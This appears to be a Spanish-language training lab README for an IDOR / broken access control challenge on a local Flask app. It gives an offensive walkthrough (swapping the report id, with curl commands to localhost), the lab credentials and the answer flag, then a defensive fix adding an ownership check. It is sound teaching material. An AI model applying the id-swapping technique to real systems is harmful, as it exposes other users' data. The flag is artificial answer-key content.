# Reto 2 — IDOR / Broken Access Control (Sistema de Reportes de Auditoría)

## Contexto
Un sistema interno permite a usuarios autenticados consultar sus
reportes de auditoría de seguridad. El backend verifica que el usuario
esté **autenticado**, pero nunca verifica que el reporte solicitado le
**pertenezca**. Esto es un Insecure Direct Object Reference (IDOR).

## Usuarios precargados
| Usuario   | Contraseña          | user_id | Reporte propio |
|-----------|---------------------|---------|-----------------|
| `auditor` | `auditor123`        | 2       | id=2 (normal)   |
| `admin`   | `admin_pwd_secret`   | 1       | id=1 (confidencial, con la flag) |

## Acceso
- **Aplicación web:** http://localhost:5002
- **Terminal (ttyd):** http://localhost:7682 (usuario `student`, con
  permisos de edición sobre `/app/app.py`)

## Parte ofensiva
1. Inicie sesión en `http://localhost:5002/login` con `auditor` /
   `auditor123`.
2. Será redirigido a su propio reporte: `http://localhost:5002/report?id=2`.
3. Cambie el parámetro `id` en la URL a `1` (el reporte del admin):

   ```
   http://localhost:5002/report?id=1
   ```

   El sistema no valida que el reporte `id=1` pertenezca al usuario
   `auditor` (`user_id=2`), por lo que se muestra el contenido
   confidencial, incluyendo la flag.

4. También puede probarse vía API, estando autenticado (reutilizando la
   cookie de sesión):

   ```bash
   curl -s -c cookies.txt -X POST http://localhost:5002/login \
        -d "username=auditor&password=auditor123"

   curl -s -b cookies.txt http://localhost:5002/api/report/1
   ```

**Flag:** `FLAG{1d0r_br0k3n_4cc3ss_c0ntr0l}`

## Parte defensiva
1. Conéctese a la terminal web (`http://localhost:7682`).
2. Edite `/app/app.py` (con `nano` o `vim`) y agregue la validación de
   autorización que falta, tanto en `/report` como en
   `/api/report/<id>`, comparando el dueño del reporte contra el
   usuario de la sesión actual:

   ```python
   from flask import abort

   if report["user_id"] != session.get("user_id"):
       return abort(403)
   ```

3. Flask corre con recarga automática (`debug=True`), por lo que el
   cambio se refleja de inmediato sin reiniciar el contenedor.
4. Verifique que, iniciando sesión como `auditor`, acceder a
   `/report?id=1` ahora devuelve `403 Forbidden`, y que `/report?id=2`
   (su propio reporte) sigue funcionando con normalidad.

## Restauración
Para volver al estado inicial (vulnerable) de todos los retos, desde la
raíz del laboratorio ejecute:

```bash
./reset.sh
```

Esto copia `app.clean/app.py` y `app.clean/database.sqlite` (las
versiones originales) sobre la carpeta `app/` activa. Como la carpeta
`app/` está montada como volumen dentro del contenedor y Flask corre en
modo debug, el cambio se aplica de inmediato sin reconstruir ni
reiniciar nada.
